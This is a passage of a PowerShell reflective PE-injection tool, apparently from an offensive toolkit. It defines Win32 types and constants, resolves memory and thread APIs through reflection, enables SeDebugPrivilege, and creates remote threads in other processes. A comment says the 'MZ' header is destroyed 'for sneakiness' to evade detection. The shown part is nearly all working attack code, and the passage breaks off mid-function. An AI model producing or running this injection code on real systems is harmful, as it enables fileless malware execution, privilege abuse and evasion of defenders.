		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
	
		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq "Size")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Invoke-CreateRemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
